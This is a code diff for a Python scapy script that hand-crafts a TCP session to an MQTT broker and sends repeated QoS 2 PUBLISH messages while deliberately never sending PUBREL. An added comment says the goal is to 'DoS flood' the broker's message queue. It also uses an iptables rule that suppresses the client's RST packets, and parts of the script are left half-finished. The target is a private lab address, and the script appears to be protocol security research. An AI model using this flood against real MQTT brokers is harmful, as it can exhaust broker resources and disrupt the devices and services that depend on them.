@@ -4,7 +4,7 @@ Extended program that executes the TCP three-way handshake using scapy and
 then proceeds to send an MQTT CONNECT and a PUBLISH message with QoS 2,
 waits for PUBREC but intentionally omits PUBREL.
 
-Should we drop w/ iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP ?
+We should drop incoming w/ iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
 missing:  
     - implenment better log
     - Parse connack
@@ -13,13 +13,14 @@ Based on scapy/normal_tcp_session.py
 
 import logging
 import sys
-import lib_scapy
+#import lib_scapy
 from scapy.all import *
 from scapy.layers.inet import IP, TCP
 
 # Define the broker IP and the TCP port
 broker_ip = '192.168.122.48'
 broker_port = 1883
+num_messages = 11  # Number of MQTT messages to DoS flood the queue with
 
 # Functions for MQTT packet crafting
 def craft_mqtt_connect(client_id="ScapyClient"):
@@ -43,21 +44,24 @@ def craft_mqtt_publish(topic, message, packet_id=1, qos=2):
     packet = fixed_header + bytes([remaining_length]) + var_header + payload
     return packet
 
+# Manually setting the values for our specific case
+si = "192.168.122.47"  # Source IP address
+sp = 12345             # Source port
+di = broker_ip  # Destination IP address
+dp = 1883              # Destination port (standard MQTT port)
+cseq = 100             # Initial TCP sequence number
+debug = 30             # Debug level (e.g., 30 for WARNING)
+return_code = 0        # Indicate successful initialization
+return_string = "Initialization successful"
 
 # Our default logging is at WARNING level
 # 10: DEBUG, 20: INFO, 30: WARNING, 40:ERROR, 50: CRITICAL
-logging_level = 30
+# Logging setup
+logging_level = debug  # Set logging level based on debug variable
 logging.basicConfig(stream=sys.stderr, level=logging_level)
-mylog=logging.getLogger("mainlogger")
+mylog = logging.getLogger("mainlogger")
 mylog.warning("Program starts")
-# unless if changed by the command line argument.
 
-# the default text to be sent from client to server is
-text="The client says hello to the server \n\n\n "
-
-# Getting all the arguments from the command line with their default values
-# if any ...
-(si,sp,di,dp,cseq,debug,return_code,return_string)=lib_scapy.get_args(sys.argv, mylog)
 
 # Setting the debug level according to a possible value provided as an argument
 mylog.setLevel(debug)
@@ -135,26 +139,29 @@ mylog.info("Sending MQTT CONNECT packet")
 send(IP(dst=di)/TCP(sport=sp, dport=dp, seq=cseq, ack=synackpkt.seq + 1, flags='PA')/Raw(load=mqtt_connect_packet), verbose=scapy_verbose)
 
 # Wait for CONNACK and parse - future implementation
+for i in range(1, num_messages + 1):
 
-# MQTT PUBLISH with QoS 2
-mqtt_publish_packet = craft_mqtt_publish("test/topic", "Test QoS 2 message")
-mylog.info("Sending MQTT PUBLISH packet with QoS 2")
-pubrec_pkt = sr1(IP(dst=di)/TCP(sport=sp, dport=dp, seq=cseq+len(mqtt_connect_packet), ack=synackpkt.seq + 1, flags='PA')/Raw(load=mqtt_publish_packet), verbose=scapy_verbose)
+    # MQTT PUBLISH with QoS 2
+    mqtt_publish_packet = craft_mqtt_publish("test/topic", "Test QoS 2 message")
+    mylog.info("Sending MQTT PUBLISH packet with QoS 2")
+    pubrec_pkt = sr1(IP(dst=di)/TCP(sport=sp, dport=dp, seq=cseq+len(mqtt_connect_packet), ack=synackpkt.seq + 1, flags='PA')/Raw(load=mqtt_publish_packet), verbose=scapy_verbose)
 
-# TODO: start reviewing here
-# Check for PUBREC response
-if pubrec_pkt and Raw in pubrec_pkt and pubrec_pkt[Raw].load[0] == 0x50:  # 0x50 = PUBREC
-    mylog.info("Received PUBREC for QoS 2 message")
-    # Here, you would craft and send a PUBREL packet, but as per your request, this is omitted
-    # Crafting PUBREL packet code would be here, commented out as per your instruction
-    # mylog.info("Sending PUBREL packet (omitted)")
-else:
-    mylog.error("Did not receive expected PUBREC")
+    # Log sending PUBLISH and receiving PUBREC
+    mylog.info(f"Sent PUBLISH {i}, waiting for PUBREC...")
+    
+    if pubrec_pkt and Raw in pubrec_pkt and pubrec_pkt[Raw].load[0] == 0x50:  # 0x50 = PUBREC
+        
+        # Update seq and ack numbers based on response
+        cseq += len(mqtt_publish_packet)
+        synackpkt.seq = pubrec_pkt.seq + len(pubrec_pkt.load)
+        mylog.info(f"Received PUBREC for message {i}")
+    else:
+        mylog.error("No PUBREC received, or response malformed.")
 
 # Placeholder for repeating the publish or gracefully closing the TCP connection
 # [... TCP connection teardown or repeat publish code ...]
 
-mylog.warning("Program ends")
+'''
 # We will never reach this place if the server sends nothing back ...:-(
 if len(pair) != 1:
     mylog.critical("We have received %s answers to DATA packet instead of 1.\nAborting", len(pair))
@@ -170,7 +177,7 @@ else:
     mylog.critical("Response to the DATA Packet had the %s flags instead of ACK \n===>You probably forgot to prevent your client from emitting a RST packet.\n\"iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP\"\n\nAborting", str(pair[0][1][TCP].flags))
     exit()
 mylog.info("data packet sent with %s bytes: \'%s\'", len(text), text)
-
+'''
 # FIN/ACK PACKET
 finpkt = datapkt.copy()
 finpkt[TCP].flags="FA"
